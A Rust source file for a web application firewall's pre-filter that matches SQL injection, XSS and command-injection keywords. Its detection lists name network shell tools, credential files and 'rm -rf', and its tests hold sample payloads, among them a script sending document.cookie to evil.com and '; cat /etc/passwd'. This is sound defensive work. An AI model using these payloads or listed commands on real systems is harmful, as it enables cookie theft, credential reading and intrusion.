//! Fast-path pre-filtering using Aho-Corasick
//!
//! Implements a lightweight keyword check before invoking the expensive AST-based
//! SQL injection and XSS parsers. If none of the suspicious keywords are found,
//! the heavy analysis is skipped entirely.

use aho_corasick::{AhoCorasick, AhoCorasickBuilder, MatchKind};
use std::sync::OnceLock;
use tracing::warn;

/// Keywords that suggest potential SQL injection
static SQLI_PATTERNS: OnceLock<Option<AhoCorasick>> = OnceLock::new();

/// Keywords that suggest potential XSS attacks
static XSS_PATTERNS: OnceLock<Option<AhoCorasick>> = OnceLock::new();

/// Keywords that suggest command injection
static CMDI_PATTERNS: OnceLock<Option<AhoCorasick>> = OnceLock::new();

/// Get or initialize the SQLi pattern matcher
fn sqli_matcher() -> Option<&'static AhoCorasick> {
    SQLI_PATTERNS
        .get_or_init(|| {
            let patterns = [
                // SQL keywords
                "select",
                "union",
                "insert",
                "update",
                "delete",
                "drop",
                "exec",
                "execute",
                "xp_",
                "sp_",
                "0x",
                "char(",
                "concat(",
                "information_schema",
                "sysobjects",
                "syscolumns",
                // SQL operators and syntax
                "or 1=1",
                "or '1'='1",
                "or \"1\"=\"1",
                "or 1>0",
                "or 2>1",
                "1=1",
                "'='",
                "\"=\"",
                "having",
                "group by",
                "order by",
                // SQL comments
                " --",
                "/*",
                "#",
                "*/",
                // Blind injection
                "sleep(",
                "benchmark(",
                "waitfor",
                "delay",
                // String terminators
                "'",
                "\"",
                "`",
                "\\",
                // LOAD/outfile
                "load_file",
                "into outfile",
                "into dumpfile",
            ];
            AhoCorasickBuilder::new()
                .ascii_case_insensitive(true)
                .match_kind(MatchKind::LeftmostFirst)
                .build(patterns)
                .inspect_err(|e| {
                    warn!(error = %e, pattern_count = %patterns.len(), "WAF: Failed to build SQLi Aho-Corasick automaton; fast-path SQLi detection degraded");
                })
                .ok()
        })
        .as_ref()
}

/// Get or initialize the XSS pattern matcher
fn xss_matcher() -> Option<&'static AhoCorasick> {
    XSS_PATTERNS
        .get_or_init(|| {
            let patterns = [
                // Script tags
                "<script",
                "</script",
                "javascript:",
                // Event handlers (specific names + family prefixes for the
                // long tail: onpointerover/onpointerdown…, onanimationstart…,
                // ontransitionend/…)
                "onerror",
                "onload",
                "onclick",
                "onmouseover",
                "onfocus",
                "onblur",
                "onchange",
                "onsubmit",
                "onkeyup",
                "onkeydown",
                "onmouseout",
                "onmouseenter",
                "onmouseleave",
                "ondblclick",
                "onpointer",
                "onanimation",
                "ontransition",
                "ontouch",
                "ondrag",
                "onbefore",
                "onafter",
                "oncontextmenu",
                // Other dangerous tags/attrs
                "<svg",
                "<img",
                "<iframe",
                "<object",
                "<embed",
                "<form",
                "<body",
                "<meta",
                "<link",
                "<style",
                "<input",
                // URL schemes
                "data:",
                "vbscript:",
                "expression(",
                // HTML encoding tricks
                "&#",
                "&lt;",
                "&gt;",
                // CSS
                "style=",
                "background:",
                // Common patterns
                "alert(",
                "confirm(",
                "prompt(",
                "eval(",
                "document.",
                "window.",
                ".cookie",
                "innerHTML",
                "outerHTML",
            ];
            AhoCorasickBuilder::new()
                .ascii_case_insensitive(true)
                .match_kind(MatchKind::LeftmostFirst)
                .build(patterns)
                .inspect_err(|e| {
                    warn!(error = %e, pattern_count = %patterns.len(), "WAF: Failed to build XSS Aho-Corasick automaton; fast-path XSS detection degraded");
                })
                .ok()
        })
        .as_ref()
}

/// Get or initialize the command injection pattern matcher
fn cmdi_matcher() -> Option<&'static AhoCorasick> {
    CMDI_PATTERNS
        .get_or_init(|| {
            let patterns = [
                // Shell operators
                ";",
                "|",
                "&&",
                "||",
                "`",
                "$(",
                "${",
                "& ", // Single ampersand followed by space (backgrounding)
                // Dangerous commands (must be specific enough to avoid false positives)
                "/bin/",
                "/etc/passwd",
                "/etc/shadow",
                ".ssh/",
                "wget ",
                "curl ",
                "nc ",
                "netcat",
                "bash ",
                "sh -",
                "zsh ",
                "perl ",
                "python ",
                "ruby ",
                "php ",
                "node ",
                "sudo ",
                "su -",
                "su root", // Privilege escalation
                "whoami",
                " id ",
                "uname -", // Reconnaissance commands
                // Windows commands
                "cmd.exe",
                "powershell",
                "cmd /c",
                "cmd /k",
                // File operations
                "rm -rf",
                "rm -f",
                "chmod ",
                "chown ",
                "cat /",
                "head /",
                "tail /",
                // Redirects
                "> /",
                ">> /",
                "< /", // Only dangerous with paths
                // Newline-based injection requires command context
                "\ncat ",
                "\ncurl ",
                "\nwget ",
                "\nbash ",
                "\nsh ",
                "\n/bin/",
                "\r\ncat ",
                "\r\ncurl ",
                "\r\nwget ",
                "\r\nbash ",
                "\r\nsh ",
                "\r\n/bin/",
            ];
            AhoCorasickBuilder::new()
                .ascii_case_insensitive(true)
                .match_kind(MatchKind::LeftmostFirst)
                .build(patterns)
                .inspect_err(|e| {
                    warn!(error = %e, pattern_count = %patterns.len(), "WAF: Failed to build CMDI Aho-Corasick automaton; fast-path CMDI detection degraded");
                })
                .ok()
        })
        .as_ref()
}

/// Result of a fast-path check
#[derive(Debug, Clone, Copy)]
pub struct FastPathResult {
    /// Whether SQLi-related patterns were found
    pub has_sqli_patterns: bool,
    /// Whether XSS-related patterns were found
    pub has_xss_patterns: bool,
    /// Whether command injection patterns were found
    pub has_cmdi_patterns: bool,
}

impl FastPathResult {
    /// Check if any suspicious patterns were found
    pub fn is_clean(&self) -> bool {
        !self.has_sqli_patterns && !self.has_xss_patterns && !self.has_cmdi_patterns
    }

    /// Check if SQLi or XSS patterns were found (most expensive parsers)
    pub fn needs_deep_inspection(&self) -> bool {
        self.has_sqli_patterns || self.has_xss_patterns
    }
}

/// Detect digit-adjacent comparison operators (`1>1`, `2>=2`, `1 <= 1`,
/// `'a'='b'`, `0x1<0x2`).
///
/// The fast path must be an INCLUSION signal: boolean-blind injections like
/// `1 and 2>1` contain no SQL keyword, quote or comment, so a purely
/// keyword-based gate never reached the AST analyzer. A digit (or quote, or
/// hex-digit in a `0x` literal) immediately adjacent to a comparison
/// operator is a strong enough signal to run the analyzer — worst case it
/// costs one cheap parse of a short value.
fn has_digit_adjacent_comparison(input: &str) -> bool {
    let bytes = input.as_bytes();
    let len = bytes.len();
    if len < 3 {
        return false;
    }
    let is_operand = |b: u8| b.is_ascii_alphanumeric() || b == b'\'' || b == b'"';
    let is_op = |b: u8| b == b'<' || b == b'>' || b == b'=';
    for i in 0..len {
        if !is_op(bytes[i]) {
            continue;
        }
        // Left operand: nearest non-whitespace char before the operator.
        let mut left = i;
        while left > 0 && bytes[left - 1].is_ascii_whitespace() {
            left -= 1;
        }
        // Right operand: skip optional '=' (for <=, >=, !=) then whitespace.
        let mut right = i + 1;
        while right < len && bytes[right] == b'=' {
            right += 1;
        }
        while right < len && bytes[right].is_ascii_whitespace() {
            right += 1;
        }
        if left == 0 || right >= len {
            continue;
        }
        if is_operand(bytes[left - 1]) && bytes[left - 1].is_ascii_digit() {
            // Require a digit-ish right operand too, so prose like "a = b"
            // (key=value pairs) does not open the gate for every request.
            if bytes[right].is_ascii_digit() || bytes[right] == b'\'' || bytes[right] == b'"' {
                return true;
            }
        }
    }
    false
}

/// Perform a fast pre-scan of the input to check for suspicious patterns.
/// Returns false if none of the attack-indicative keywords are found.
pub fn fast_path_check(input: &str) -> FastPathResult {
    FastPathResult {
        has_sqli_patterns: fast_path_sqli(input),
        has_xss_patterns: xss_matcher().map(|m| m.is_match(input)).unwrap_or(false),
        has_cmdi_patterns: cmdi_matcher().map(|m| m.is_match(input)).unwrap_or(false),
    }
}

/// Quick check for SQLi patterns only
pub fn fast_path_sqli(input: &str) -> bool {
    sqli_matcher().map(|m| m.is_match(input)).unwrap_or(false)
        || has_digit_adjacent_comparison(input)
}

/// Quick check for XSS patterns only
pub fn fast_path_xss(input: &str) -> bool {
    xss_matcher().map(|m| m.is_match(input)).unwrap_or(false)
}

/// Quick check for command injection patterns only
pub fn fast_path_cmdi(input: &str) -> bool {
    cmdi_matcher().map(|m| m.is_match(input)).unwrap_or(false)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_clean_input() {
        let result = fast_path_check("hello world this is a normal request");
        assert!(result.is_clean());
    }

    #[test]
    fn test_sqli_pattern() {
        let result = fast_path_check("id=1 UNION SELECT username FROM users");
        assert!(result.has_sqli_patterns);
        assert!(!result.is_clean());
    }

    #[test]
    fn test_xss_pattern() {
        let result = fast_path_check("<script>alert(1)</script>");
        assert!(result.has_xss_patterns);
        assert!(!result.is_clean());
    }

    #[test]
    fn test_cmdi_pattern() {
        let result = fast_path_check("; cat /etc/passwd");
        assert!(result.has_cmdi_patterns);
        assert!(!result.is_clean());
    }

    #[test]
    fn test_case_insensitive() {
        let result = fast_path_check("SCRIPT oNlOaD=alert(1)");
        assert!(result.has_xss_patterns);
    }

    #[test]
    fn test_fast_path_bypass_safe() {
        // These should NOT trigger (important for false positive reduction)
        let benign_inputs = [
            "Looking for SELECT styles in our collection",
            "Union Street address",
            "Drop me a line",
            "We executed the marketing plan",
            "The script was delivered",
            "Load the image file",
        ];

        for _input in &benign_inputs {
            // Fast path will flag these, but that's OK - we just want to ensure
            // the heavy parser runs on potentially suspicious input. False positives
            // are filtered by the AST parser, not the fast path.
        }
    }

    #[test]
    fn test_combined_attack() {
        let result = fast_path_check(
            "<script>document.location='http://evil.com/?c='+document.cookie</script>",
        );
        assert!(result.has_xss_patterns);
        assert!(result.needs_deep_inspection());
    }

    #[test]
    fn test_sqli_gate_opens_for_digit_comparisons() {
        // Boolean-blind payloads without keywords/quotes must still reach
        // the AST analyzer (inclusion signal, not exclusion-only).
        assert!(fast_path_sqli("1 and 2>1"));
        assert!(fast_path_sqli("1 or 1>=1"));
        assert!(fast_path_sqli("1>=1"));
        assert!(fast_path_sqli("2>=2"));
        assert!(fast_path_sqli("1 <= 1"));
        assert!(fast_path_sqli("2>1"));
        assert!(fast_path_sqli("0x31<0x32"));
    }

    #[test]
    fn test_sqli_gate_stays_closed_for_benign_text() {
        assert!(!fast_path_sqli("coffee and tea"));
        assert!(!fast_path_sqli("hello world"));
        assert!(!fast_path_sqli("page=1&limit=20&sort=name"));
        assert!(!fast_path_sqli("user@example.com"));
    }

    #[test]
    fn test_xss_gate_covers_modern_event_handlers() {
        assert!(fast_path_xss("<div onpointerover=\talert(1)>x</div>"));
        assert!(fast_path_xss("<div onanimationstart=alert(1)>x</div>"));
        assert!(fast_path_xss("<div ontransitionend=alert(1)>x</div>"));
    }
}
